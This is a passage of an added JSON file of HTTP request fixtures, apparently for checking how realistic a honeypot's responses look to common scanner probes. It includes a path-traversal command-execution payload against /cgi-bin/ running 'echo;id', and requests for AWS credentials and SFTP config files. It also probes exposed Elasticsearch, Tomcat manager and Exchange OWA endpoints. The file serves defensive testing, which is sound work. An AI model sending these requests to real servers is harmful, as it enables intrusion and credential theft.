+  "requisicao_http": "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: */*\nContent-Type: text/plain\nContent-Length: 7\n\necho;id"
+ },
+ {
+  "id": "V09",
+  "grupo": "validacao",
+  "descricao": "Elasticsearch _search (475 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/_search",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/json"
+  ],
+  "realismo": {
+   "expects": [
+    "\"took\"",
+    "\"hits\"",
+    "\"_shards\"|\"timed_out\""
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /_search HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: application/json"
+ },
+ {
+  "id": "V10",
+  "grupo": "validacao",
+  "descricao": "Spring actuator health (464 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/actuator/health",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/json",
+   "application/vnd.spring-boot.actuator"
+  ],
+  "realismo": {
+   "expects": [
+    "\"status\"",
+    "\"UP\"|\"DOWN\"",
+    "\"components\"|\"diskSpace\""
+   ],
+   "min_hits": 2,
+   "min_len": 10
+  },
+  "requisicao_http": "GET /actuator/health HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: application/json"
+ },
+ {
+  "id": "V11",
+  "grupo": "validacao",
+  "descricao": "sellers.json (414 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/sellers.json",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/json"
+  ],
+  "realismo": {
+   "expects": [
+    "\"sellers\"",
+    "\"seller_id\"|\"seller_type\"",
+    "\"version\""
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /sellers.json HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: application/json"
+ },
+ {
+  "id": "V12",
+  "grupo": "validacao",
+  "descricao": "CouchDB _all_dbs (408 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/_all_dbs",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/json",
+   "text/plain",
+   "text",
+   "application/octet-stream"
+  ],
+  "realismo": {
+   "expects": [
+    "^\\s*\\[",
+    "\"_users\"|\"_replicator\"|\"_global_changes\"",
+    "\"\\w+\""
+   ],
+   "min_hits": 2,
+   "min_len": 2
+  },
+  "requisicao_http": "GET /_all_dbs HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: application/json"
+ },
+ {
+  "id": "V13",
+  "grupo": "validacao",
+  "descricao": "Hadoop JMX (382 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/jmx",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/json"
+  ],
+  "realismo": {
+   "expects": [
+    "\"beans\"",
+    "\"name\"\\s*:\\s*\"Hadoop:|\"modelerType\"",
+    "\"java\\.lang:"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /jmx HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: application/json"
+ },
+ {
+  "id": "V14",
+  "grupo": "validacao",
+  "descricao": "Docker registry catalog (336 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/v2/_catalog",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/json"
+  ],
+  "realismo": {
+   "expects": [
+    "\"repositories\"",
+    "^\\s*\\{",
+    "\"\\w[\\w/-]*\""
+   ],
+   "min_hits": 2,
+   "min_len": 15
+  },
+  "requisicao_http": "GET /v2/_catalog HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: application/json"
+ },
+ {
+  "id": "V15",
+  "grupo": "validacao",
+  "descricao": "Tomcat manager (317 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/manager/html",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/html"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)tomcat",
+    "(?i)manager",
+    "(?i)401|unauthorized|<form|password|realm"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /manager/html HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: text/html"
+ },
+ {
+  "id": "V16",
+  "grupo": "validacao",
+  "descricao": "Solr system info (299 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/solr/admin/info/system",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/json",
+   "application/soap+xml",
+   "application/xml",
+   "text/xml"
+  ],
+  "realismo": {
+   "expects": [
+    "\"responseHeader\"|<lst name=\"responseHeader\"",
+    "(?i)\"lucene\"|solr-spec-version|\"solr_home\"",
+    "(?i)\"jvm\"|\"system\""
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /solr/admin/info/system HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: application/json"
+ },
+ {
+  "id": "V17",
+  "grupo": "validacao",
+  "descricao": "AWS credentials (249 ips)",
+  "categoria": "Exfiltracao",
+  "metodo": "GET",
+  "path": "/.aws/credentials",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/plain",
+   "text",
+   "application/octet-stream"
+  ],
+  "realismo": {
+   "expects": [
+    "\\[default\\]|\\[\\w+\\]",
+    "aws_access_key_id\\s*=",
+    "aws_secret_access_key\\s*="
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /.aws/credentials HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: */*"
+ },
+ {
+  "id": "V18",
+  "grupo": "validacao",
+  "descricao": "Apache server-status (237 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/server-status",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/html",
+   "text/plain",
+   "text",
+   "application/octet-stream"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)Apache Server Status",
+    "(?i)Server Version|Server uptime|Total accesses",
+    "(?i)requests currently being processed|CPU Usage|<table"
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /server-status HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: text/html"
+ },
+ {
+  "id": "V19",
+  "grupo": "validacao",
+  "descricao": "Exchange OWA (230 ips)",
+  "categoria": "Recon",
+  "metodo": "GET",
+  "path": "/owa/",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "text/html"
+  ],
+  "realismo": {
+   "expects": [
+    "(?i)outlook|owa|exchange",
+    "(?i)<form",
+    "(?i)password|username|domain\\\\user",
+    "(?i)sign in|logon"
+   ],
+   "min_hits": 3
+  },
+  "requisicao_http": "GET /owa/ HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: text/html"
+ },
+ {
+  "id": "V20",
+  "grupo": "validacao",
+  "descricao": "VS Code sftp.json (224 ips)",
+  "categoria": "Exfiltracao",
+  "metodo": "GET",
+  "path": "/.vscode/sftp.json",
+  "esperado": "conteudo",
+  "content_types_aceitos": [
+   "application/json",
+   "text/plain",
+   "text",
+   "application/octet-stream"
+  ],
+  "realismo": {
+   "expects": [
+    "\"host\"",
+    "\"username\"|\"password\"|\"privateKeyPath\"",
+    "\"remotePath\"|\"protocol\"|\"port\""
+   ],
+   "min_hits": 2
+  },
+  "requisicao_http": "GET /.vscode/sftp.json HTTP/1.1\nHost: 203.0.113.10\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\nAccept: application/json"
+ }
+]
